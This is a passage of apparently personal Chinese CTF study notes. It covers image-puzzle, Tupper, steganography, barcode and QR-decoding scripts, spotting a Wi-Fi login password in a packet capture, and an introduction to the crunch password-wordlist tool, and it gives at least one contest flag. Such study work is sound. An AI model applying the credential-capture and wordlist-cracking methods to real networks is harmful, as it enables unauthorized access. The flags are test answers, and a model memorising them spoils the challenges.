    <url>/2026/01/19/MISC/%E7%85%A7%E7%89%87/%E4%BA%8C%E7%BB%B4%E7%A0%81%E6%8B%BC%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="二维码拼图"><a href="#二维码拼图" class="headerlink" title="二维码拼图"></a>二维码拼图</h1><p><a href="https://blog.csdn.net/m0_65455660/article/details/137480034">Montage+gaps拼图（详细）_montage拼图-CSDN博客</a></p><p>sudo apt-get install imagemagick</p><p>montage 的基本命令格式如下：</p><p>montage [options] image1.jpg [image2.jpg …] output.jpg</p><p>1</p><p>其中，image1.jpg、image2.jpg 等是你想要拼接的图像文件，output.jpg 是拼接后的输出文件名。</p><p>拼接参数：</p><p>.tile：用于指定拼接的布局，格式为 rowsxcolumns。例如，-tile 2x3 表示将图像分成 2 行 3 列。</p><p>-geometry：用于指定每个图像块的大小和位置。例如，-geometry +0+0 表示没有间隙地拼接图像。</p><p>-gaps：在图像之间添加间隙，例如 -gaps 10x10。</p><p><img src="/./img/49277317_S5PODXHSILLfSw-V/1731398038796-cc4cc672-5615-4b40-8ceb-d5f6871ca31f-147824.png" alt="1731398038796-cc4cc672-5615-4b40-8ceb-d5f6871ca31f.png"></p><p>montage *.jpg -tile 6x6 -geometry +0+0 output.jpg</p><p>安装依赖项：</p><p>首先，确保你的系统上安装了 Python 和 Git。</p><p>克隆 gaps 的 GitHub 仓库：git clone <a href="https://github.com/nemanja-m/gaps.git">https://github.com/nemanja-m/gaps.git</a></p><p>进入 gaps 目录：cd gaps</p><p>安装 Python 依赖项：pip install -r requirements.txt</p><p>安装 Python 的 Tkinter 库（如果系统提示需要）：sudo apt-get install python-tk</p><p>本地安装项目：pip install .</p><p>如果$ pip install -r requirements.txt 出现错误，则要手动安装numpy 、opencv-python 、matplotlib 、pytest 、 pillow，并将对应的库的版本在requirements.txt上修改</p><p>原文链接：<a href="https://blog.csdn.net/m0_65455660/article/details/137480034">https://blog.csdn.net/m0_65455660&#x2F;article&#x2F;details&#x2F;137480034</a></p><p>创建拼图：</p><p>使用 gaps create使用图像创建拼图。例如：</p><p>gaps create gaps.png a.png –size&#x3D;48</p><p>这将创建一个拼图，其中每个拼图块的尺寸为 48x48 像素。</p><p>解决拼图问题：</p><p>使用 gaps 脚本来解决拼图。例如：</p><p>gaps run …&#x2F;flag.jpg …&#x2F;lala.jpg –generations&#x3D;20 –population&#x3D;100</p><p>这将启动遗传算法，初始种群为 100 个个体，进行 20 代的迭代。</p><p>可选参数：</p><p>–size：拼图块的像素尺寸。如果不确定，gaps 可以自动检测。</p><p>–generations：遗传算法的代数。</p><p>–population：种群中的个体数量。</p><p>–verbose：每一代训练结束后展示最佳结果。</p><p>–save：将拼图解决方案保存为图像。</p><p>解决拼图：</p><p>如果拼图结果不理想，可以尝试调整 –generations 和 –population 参数，以增加迭代次数和种群大小。</p><p><a href="https://www.jianshu.com/p/d9e9019e8148">linux下拼图工具gaps安装教程 - 简书</a></p><p><font style="color:rgb(64, 64, 64);">分别安装numpy，opencv-python，matplotlib，pytest，pillow</font></p><p><img src="/./img/49277317_S5PODXHSILLfSw-V/1731393251209-eba910ba-e536-4cb7-9256-fe3bf21d3fe2-006214.png" alt="1731393251209-eba910ba-e536-4cb7-9256-fe3bf21d3fe2.png"><font style="color:rgb(64, 64, 64);"><br></font></p><p><img src="/./img/49277317_S5PODXHSILLfSw-V/1731393263772-137491fe-fe67-4208-86cf-cade30299c47-585616.png" alt="1731393263772-137491fe-fe67-4208-86cf-cade30299c47.png"></p><p>也是成功安装好了gaps</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h2><p><img src="/./img/49277317_S5PODXHSILLfSw-V/1731393279790-d152df61-5f33-47ea-8460-2a9880265cf3-347007.png" alt="1731393279790-d152df61-5f33-47ea-8460-2a9880265cf3.png"></p><p><img src="/./img/49277317_S5PODXHSILLfSw-V/1731393290751-dfd7086b-ee97-4bbb-a1c2-26ae0e2934bd-958500.png" alt="1731393290751-dfd7086b-ee97-4bbb-a1c2-26ae0e2934bd.png"></p><h2 id="2、"><a href="#2、" class="headerlink" title="2、"></a>2、</h2><blockquote><p>更新: 2024-11-12 15:56:02<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/mhgd0mwpnkt1a2l4">https://www.yuque.com/chaye-apqbl/vsc85q/mhgd0mwpnkt1a2l4</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E7%85%A7%E7%89%87/Tupper/"/>
    <url>/2026/01/19/MISC/%E7%85%A7%E7%89%87/Tupper/</url>
    
    <content type="html"><![CDATA[<h1 id="Tupper"><a href="#Tupper" class="headerlink" title="Tupper"></a>Tupper</h1><h1 id="在线网站"><a href="#在线网站" class="headerlink" title="在线网站"></a>在线网站</h1><p><a href="https://tuppers-formula.ovh/">Tupper’s Formula Tools (tuppers-formula.ovh)</a></p><p>全部倒转过来<img src="/./img/tlbvsl3pI2MJ1shN/1729224932026-511356e6-0c90-4df4-9177-62ee965e395d-961640.png" alt="1729224932026-511356e6-0c90-4df4-9177-62ee965e395d.png"></p><h2 id="tupperexp"><a href="#tupperexp" class="headerlink" title="tupperexp"></a>tupperexp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plain">import numpy as np<br>import matplotlib.pyplot as plt<br>from PIL import Image<br><br><br>def Tupper_self_referential_formula(k):<br>    aa = np.zeros((17, 106))<br><br>    def f(x, y):<br>        y += k<br>        a1 = 2 ** -(-17 * x - y % 17)<br>        a2 = (y // 17) // a1<br>        return 1 if a2 % 2 &gt; 0.5 else 0<br><br>    for y in range(17):<br>        for x in range(106):<br>            aa[y, x] = f(x, y)<br>    return aa[:, ::-1]<br><br><br>k = 9489414856877039590479997730148554425666925984049232945604842888420596111937489062065081199094002132087091572191187170308560128611026043144427876131133135794969867759108490917632153891963456295991713868378392769549376070709924497237322046334486274987407067993824142187115870972520417207510521083293280152434558803258138899515603807505064799735152359900010019631133734298562293682916239050320580346316026460860919542540955914826806059123630945216006606268974979135253968165822806241305783300650874506602000048154282039485531804337171305656252<br><br><br>aa = Tupper_self_referential_formula(k)<br>plt.figure(figsize=(15, 10))<br>plt.imshow(aa, origin=&#x27;lower&#x27;)<br>plt.savefig(&quot;tupper.png&quot;)<br>img = Image.open(&#x27;tupper.png&#x27;)<br># 翻转<br>dst1 = img.transpose(Image.FLIP_LEFT_RIGHT).rotate(180)<br>plt.imshow(dst1)<br>plt.show()<br></code></pre></td></tr></table></figure><p>倒序一下数据再生成照片</p><p><img src="/./img/tlbvsl3pI2MJ1shN/1729224750548-493fc2ee-d29b-4516-bbee-15a2a4ba4c90-063704.png" alt="1729224750548-493fc2ee-d29b-4516-bbee-15a2a4ba4c90.png"></p><p><img src="/./img/tlbvsl3pI2MJ1shN/1729224835166-4b726f7d-cfc4-499f-965e-7b22849313b9-454904.png" alt="1729224835166-4b726f7d-cfc4-499f-965e-7b22849313b9.png"></p><p>倒过来看一下</p><p><img src="/./img/tlbvsl3pI2MJ1shN/1729224875926-91580a7e-50bc-446b-b08e-7231c15ccfa6-042600.png" alt="1729224875926-91580a7e-50bc-446b-b08e-7231c15ccfa6.png"></p><h2 id="在线网站-1"><a href="#在线网站-1" class="headerlink" title="在线网站"></a>在线网站</h2><p><a href="https://tuppers-formula.ovh/">https://tuppers-formula.ovh/</a></p><p><img src="/./img/tlbvsl3pI2MJ1shN/1729227942159-981a2f37-2b96-4156-b224-b552a181b9c8-417394.png" alt="1729227942159-981a2f37-2b96-4156-b224-b552a181b9c8.png"></p><blockquote><p>更新: 2025-08-17 14:00:30<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/txg8mui7m8lqdnyl">https://www.yuque.com/chaye-apqbl/vsc85q/txg8mui7m8lqdnyl</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E7%85%A7%E7%89%87/SSTV%E8%A7%A3%E7%A0%81%E8%BD%AC%E5%9B%BE%E7%89%87/"/>
    <url>/2026/01/19/MISC/%E7%85%A7%E7%89%87/SSTV%E8%A7%A3%E7%A0%81%E8%BD%AC%E5%9B%BE%E7%89%87/</url>
    
    <content type="html"><![CDATA[<h1 id="SSTV解码转图片"><a href="#SSTV解码转图片" class="headerlink" title="SSTV解码转图片"></a>SSTV解码转图片</h1><p><a href="https://blog.csdn.net/orchid_sea/article/details/138075312">https://blog.csdn.net/orchid_sea&#x2F;article&#x2F;details&#x2F;138075312</a></p><blockquote><p>更新: 2025-08-09 10:44:44<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/ho6hfirkovdit6og">https://www.yuque.com/chaye-apqbl/vsc85q/ho6hfirkovdit6og</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E7%85%A7%E7%89%87/plot%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2026/01/19/MISC/%E7%85%A7%E7%89%87/plot%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="plot的使用"><a href="#plot的使用" class="headerlink" title="plot的使用"></a>plot的使用</h1><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><ol><li>CTF练习：BugkuCTF杂项题：图穷匕见，给出详细的解题过程。</li></ol><p><img src="/./img/8fD1ecBgqVqZaMm3/1730291359338-073b0c39-d7e3-4874-ae09-701dbe1d904e-072488.png" alt="1730291359338-073b0c39-d7e3-4874-ae09-701dbe1d904e.png"></p><p><img src="/./img/8fD1ecBgqVqZaMm3/1730291366965-87b4c5dd-e770-451e-b894-2536a3efb423-880105.png" alt="1730291366965-87b4c5dd-e770-451e-b894-2536a3efb423.png"></p><p>去括号脚本</p><h1 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h1><p>with open(“1.txt”, “r”) as infile:<br>    lines &#x3D; infile.readlines()  </p><h1 id="处理每一行，去掉括号和逗号，数字之间用空格分隔"><a href="#处理每一行，去掉括号和逗号，数字之间用空格分隔" class="headerlink" title="处理每一行，去掉括号和逗号，数字之间用空格分隔"></a>处理每一行，去掉括号和逗号，数字之间用空格分隔</h1><p>processed_lines &#x3D; []<br>for line in lines:<br>    # 去掉括号和逗号，并去除首尾的空白字符<br>    new_line &#x3D; line.replace(“(“, “”).replace(“)”, “”).replace(“,”, “ “).strip()<br>    processed_lines.append(new_line)  </p><h1 id="将修改后的内容写入新文件"><a href="#将修改后的内容写入新文件" class="headerlink" title="将修改后的内容写入新文件"></a>将修改后的内容写入新文件</h1><p>with open(“output.txt”, “w”) as outfile:<br>    for processed_line in processed_lines:<br>        outfile.write(processed_line + “\n”)  </p><p>print(“已成功转换，结果保存在 output.txt 文件中”)</p><p>扫码得到flag</p><p><img src="/./img/8fD1ecBgqVqZaMm3/1730291448189-9067c8bf-c436-4c82-a71f-11ac8bf28cd1-571024.png" alt="1730291448189-9067c8bf-c436-4c82-a71f-11ac8bf28cd1.png"></p><blockquote><p>更新: 2024-10-30 20:31:31<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/tgpgp9tv3ub5tc6w">https://www.yuque.com/chaye-apqbl/vsc85q/tgpgp9tv3ub5tc6w</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E7%85%A7%E7%89%87/mkBT%E9%9A%90%E5%86%99/"/>
    <url>/2026/01/19/MISC/%E7%85%A7%E7%89%87/mkBT%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h1 id="mkBT隐写"><a href="#mkBT隐写" class="headerlink" title="mkBT隐写"></a>mkBT隐写</h1><h1 id="Adobe专属的数据块-如下"><a href="#Adobe专属的数据块-如下" class="headerlink" title="Adobe专属的数据块 如下"></a><font style="color:rgb(0, 0, 0);">Adobe专属的数据块 如下</font></h1><p>使用fireworks打开</p><p><img src="/./img/lb_LNpea5ylZ7wBl/1760152283368-e93482ed-6215-44ca-9984-0ad1ab8fff9b-169021.png" alt="1760152283368-e93482ed-6215-44ca-9984-0ad1ab8fff9b.png"></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="（2025-羊城杯）成功男人背后的女人"><a href="#（2025-羊城杯）成功男人背后的女人" class="headerlink" title="（2025-羊城杯）成功男人背后的女人"></a>（2025-羊城杯）成功男人背后的女人</h2><p>发现最后一个块没被填满</p><p><img src="/./img/lb_LNpea5ylZ7wBl/1760150010449-f201c675-2118-4e59-a2df-93ddddb6135b-700887.png" alt="1760150010449-f201c675-2118-4e59-a2df-93ddddb6135b.png"></p><p>尝试后发现无果 去搜一下mkBT隐写什么</p><p>用fireworks打开发现还有一层</p><p><img src="/./img/lb_LNpea5ylZ7wBl/1760152935985-f3d0928f-5808-46b6-b428-49dabe9ed2a2-316550.png" alt="1760152935985-f3d0928f-5808-46b6-b428-49dabe9ed2a2.png"></p><ul><li>通常红色的♀（女性符号）代表 <code>0</code></li><li>蓝色的♂（男性符号）代表 <code>1</code></li><li>颜色或符号可作为二进制的两种状态</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">01000</span> <span class="hljs-number">10001</span> <span class="hljs-number">00000</span> <span class="hljs-number">10101</span> <span class="hljs-number">00110</span> <span class="hljs-number">10000</span> <span class="hljs-number">11</span><br><span class="hljs-number">01010</span> <span class="hljs-number">10001</span> <span class="hljs-number">00011</span> <span class="hljs-number">00111</span> <span class="hljs-number">10110</span> <span class="hljs-number">11101</span> <span class="hljs-number">11</span><br><span class="hljs-number">00110</span> <span class="hljs-number">00001</span> <span class="hljs-number">10110</span> <span class="hljs-number">10100</span> <span class="hljs-number">01010</span> <span class="hljs-number">10011</span> <span class="hljs-number">10</span><br><span class="hljs-number">01011</span> <span class="hljs-number">11101</span> <span class="hljs-number">10001</span> <span class="hljs-number">00110</span> <span class="hljs-number">01010</span> <span class="hljs-number">11010</span> <span class="hljs-number">00</span><br><span class="hljs-number">00110</span> <span class="hljs-number">00101</span> <span class="hljs-number">10111</span> <span class="hljs-number">00100</span> <span class="hljs-number">01000</span> <span class="hljs-number">10111</span> <span class="hljs-number">11</span><br><span class="hljs-number">01001</span> <span class="hljs-number">10101</span> <span class="hljs-number">00010</span> <span class="hljs-number">10110</span> <span class="hljs-number">11100</span> <span class="hljs-number">11111</span> <span class="hljs-number">01</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"># -*- coding: utf<span class="hljs-number">-8</span> -*-<br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">将混合空格换行的二进制字符串转为 ASCII 字符</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br><br>binary_data = <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">01000 10001 00000 10101 00110 10000 11</span><br><span class="hljs-string">01010 10001 00011 00111 10110 11101 11</span><br><span class="hljs-string">00110 00001 10110 10100 01010 10011 10</span><br><span class="hljs-string">01011 11101 10001 00110 01010 11010 00</span><br><span class="hljs-string">00110 00101 10111 00100 01000 10111 11</span><br><span class="hljs-string">01001 10101 00010 10110 11100 11111 01</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br><br># 去掉所有空格和换行<br>clean_data = <span class="hljs-string">&#x27;&#x27;.join(binary_data.split())</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 每8位分组转成字符</span><br><span class="hljs-string">text = &#x27;</span>&#x27;<br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">0</span>, len(clean_data), <span class="hljs-number">8</span>):<br>    byte = clean_data[i:i+<span class="hljs-number">8</span>]<br>    <span class="hljs-keyword">if</span> len(byte) == <span class="hljs-number">8</span>:<br>        text += chr(<span class="hljs-type">int</span>(byte, <span class="hljs-number">2</span>))<br><br>print(<span class="hljs-string">&quot;解码结果：&quot;</span>, text)<br>#DASCTF&#123;w0mEN_beh1nD_MEn&#125;<br></code></pre></td></tr></table></figure><p>交flag里面的 w0mEN_beh1nD_MEn</p><blockquote><p>更新: 2025-10-11 11:36:55<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/xr6atcwyl1q1t71f">https://www.yuque.com/chaye-apqbl/vsc85q/xr6atcwyl1q1t71f</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E7%85%A7%E7%89%87/index/"/>
    <url>/2026/01/19/MISC/%E7%85%A7%E7%89%87/index/</url>
    
    <content type="html"><![CDATA[<h1 id="照片"><a href="#照片" class="headerlink" title="照片"></a>照片</h1><blockquote><p>更新: 2024-11-07 16:37:02<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/unxnshq5byaeges4">https://www.yuque.com/chaye-apqbl/vsc85q/unxnshq5byaeges4</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E7%85%A7%E7%89%87/IDAT%E9%9A%90%E5%86%99/"/>
    <url>/2026/01/19/MISC/%E7%85%A7%E7%89%87/IDAT%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h1 id="IDAT隐写"><a href="#IDAT隐写" class="headerlink" title="IDAT隐写"></a>IDAT隐写</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">import zlib<br><br>import binascii<br><br>IDAT = &quot;IDAT_data&quot;.decode(&#x27;hex&#x27;)<br><br>result = binascii.hexlify(zlib.decompress(IDAT))<br><br>print (result.decode(&#x27;hex&#x27;))<br><br>print (len(result.decode(&#x27;hex&#x27;)))<br></code></pre></td></tr></table></figure><blockquote><p>更新: 2025-10-11 11:07:23<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/tf3qf5i1tde30gb8">https://www.yuque.com/chaye-apqbl/vsc85q/tf3qf5i1tde30gb8</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E7%85%A7%E7%89%87/01%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AC%E7%A0%81/"/>
    <url>/2026/01/19/MISC/%E7%85%A7%E7%89%87/01%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AC%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="01二进制转码"><a href="#01二进制转码" class="headerlink" title="01二进制转码"></a>01二进制转码</h1><h1 id="转一维码"><a href="#转一维码" class="headerlink" title="转一维码"></a>转一维码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image, ImageDraw<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">binary_to_barcode</span>(<span class="hljs-params">binary_string, bar_width=<span class="hljs-number">4</span>, bar_height=<span class="hljs-number">100</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    将01字符串转成一维条形码图像。</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    :param binary_string: 只包含0和1的字符串</span><br><span class="hljs-string">    :param bar_width: 每一条的宽度（像素）</span><br><span class="hljs-string">    :param bar_height: 高度（像素）</span><br><span class="hljs-string">    :return: Image 对象</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    img_width = <span class="hljs-built_in">len</span>(binary_string) * bar_width<br>    img = Image.new(<span class="hljs-string">&quot;1&quot;</span>, (img_width, bar_height), <span class="hljs-number">1</span>)  <span class="hljs-comment"># 1表示白色背景</span><br>    draw = ImageDraw.Draw(img)<br><br>    <span class="hljs-keyword">for</span> i, bit <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(binary_string):<br>        x = i * bar_width<br>        <span class="hljs-keyword">if</span> bit == <span class="hljs-string">&#x27;1&#x27;</span>:<br>            draw.rectangle([x, <span class="hljs-number">0</span>, x + bar_width - <span class="hljs-number">1</span>, bar_height], fill=<span class="hljs-number">0</span>)  <span class="hljs-comment"># 黑条</span><br><br>    <span class="hljs-keyword">return</span> img<br><br><span class="hljs-comment"># 示例：你的296位字符串</span><br>binary_string = <span class="hljs-string">&quot;01111011011110110111101101111011011110111100100101011001100100010101100101110011000001011101100110001001111100110011100101011001001100010000010100110011111010011101000100000101001100111001000101101001101100011011000101111001000001010011001110010001011110011110100100000101010101011111001101100001&quot;</span><br><br><span class="hljs-comment"># 生成并显示图像</span><br>barcode_img = binary_to_barcode(binary_string)<br>barcode_img.show()<br><br><span class="hljs-comment"># 可选：保存图像</span><br><span class="hljs-comment"># barcode_img.save(&quot;output_barcode.png&quot;)</span><br><br></code></pre></td></tr></table></figure><h1 id="转二维码"><a href="#转二维码" class="headerlink" title="转二维码"></a>转二维码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plain">from PIL import Image<br>MAX = 17<br>#二维码大小<br>pic = Image.new(&quot;RGB&quot;,(MAX, MAX))<br>str = &quot;01111011011110110111101101111011011110111100100101011001100100010101100101110011000001011101100110001001111100110011100101011001001100010000010100110011111010011101000100000101001100111001000101101001101100011011000101111001000001010011001110010001011110011110100100000101010101011111001101100001&quot;<br># str为获取的01片段<br>i=0<br>for y in range (0,MAX):<br>    for x in range (0,MAX):<br>        if(str[i] == &#x27;1&#x27;):<br>            pic.putpixel([x,y],(0, 0, 0))<br>        else:<br>            pic.putpixel([x,y],(255,255,255))<br>        i = i+1<br>pic.show()<br># pic.save(&quot;1.png&quot;)<br>#由于直接预览分辨率太低，所以保存下来观看<br></code></pre></td></tr></table></figure><blockquote><p>更新: 2025-08-06 13:38:00<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/gmgn532b93ng76ty">https://www.yuque.com/chaye-apqbl/vsc85q/gmgn532b93ng76ty</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%B5%81%E9%87%8F/"/>
    <url>/2026/01/19/MISC/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%B5%81%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="虚拟机流量"><a href="#虚拟机流量" class="headerlink" title="虚拟机流量"></a>虚拟机流量</h1><h1 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征<img src="/./img/jOZbx_we6iNPN8Wq/1756181117049-2480feda-78e0-4fde-b219-ed94f1f49322-798148.png" alt="1756181117049-2480feda-78e0-4fde-b219-ed94f1f49322.png"></h1><blockquote><p>更新: 2025-08-26 12:05:25<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/oyoudvfsawe3gke2">https://www.yuque.com/chaye-apqbl/vsc85q/oyoudvfsawe3gke2</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E5%9F%BA%E7%A1%80%E5%88%86%E6%9E%90/"/>
    <url>/2026/01/19/MISC/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E5%9F%BA%E7%A1%80%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><h1 id="1、flag明文"><a href="#1、flag明文" class="headerlink" title="1、flag明文"></a>1、flag明文</h1><p>ctrl+f<br>直接在上方搜寻字符串就可以找到</p><h1 id="2、flag编码"><a href="#2、flag编码" class="headerlink" title="2、flag编码"></a>2、flag编码</h1><p>flag的16进制编码：666C6167</p><h1 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h1><p>题目让我们寻找wifi密码，先用http contains “log” 筛选，找到post回应</p><p><img src="/./img/49277317_I_Z4GrdQ6qfY07tJ/1721091561502-94f82e18-6554-4e29-b7d3-36bcf6c3712a-267833.png" alt="1721091561502-94f82e18-6554-4e29-b7d3-36bcf6c3712a.png"></p><p>为防止登录密码不正确，可以追踪http流查看到OK,证明是正确密码</p><p><img src="/./img/49277317_I_Z4GrdQ6qfY07tJ/1721091643220-7aa31531-6cee-42a2-9097-21f728bb3ad3-672325.png" alt="1721091643220-7aa31531-6cee-42a2-9097-21f728bb3ad3.png"></p><blockquote><p>更新: 2024-10-17 10:15:42<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/ivxgp64e1iylahh8">https://www.yuque.com/chaye-apqbl/vsc85q/ivxgp64e1iylahh8</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/wifi%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
    <url>/2026/01/19/MISC/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/wifi%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</url>
    
    <content type="html"><![CDATA[<h1 id="wifi密码爆破"><a href="#wifi密码爆破" class="headerlink" title="wifi密码爆破"></a>wifi密码爆破</h1><h1 id="wifi密码-例题"><a href="#wifi密码-例题" class="headerlink" title="wifi密码 例题"></a>wifi密码 例题</h1><h2 id="crunch介绍与使用"><a href="#crunch介绍与使用" class="headerlink" title="crunch介绍与使用"></a>crunch介绍与使用</h2><h3 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h3><p>crunch是什么？</p><p>Crunch是一种创建密码字典工具，按照指定的规则生成密码字典，可以灵活的制定自己的字典文件。使用Crunch工具生成的密码可以输出到屏幕，保存到文件、或另一个程序。</p><h3 id="2、使用"><a href="#2、使用" class="headerlink" title="2、使用"></a>2、使用</h3><p>Kali中已自带crunch工具，可直接在kali中使用。</p><p><img src="/./img/lR-8Z2QnhKlT_Qza/1716614477509-552d4d9e-6a58-423b-b5f4-f395fe0e0b4d-707158.png" alt="1716614477509-552d4d9e-6a58-423b-b5f4-f395fe0e0b4d.png"></p><p>命令格式：</p><p>crunch <min-len>  <max-len>  [<charset string>] [options]</p><p>参数：</p><p>min-len 最小长度字符串，即使不使用参数的值，也需要此选项</p><p>max-len 最大长度字符串，即使不使用参数的值，也需要此选项</p><p>charset string 字符集设置，默认是小写字符集</p><p>options :</p><p>-b     指定文件输出的大小，避免字典文件过大  </p><p>-c     指定文件输出的行数，即包含密码的个数</p><p>-d   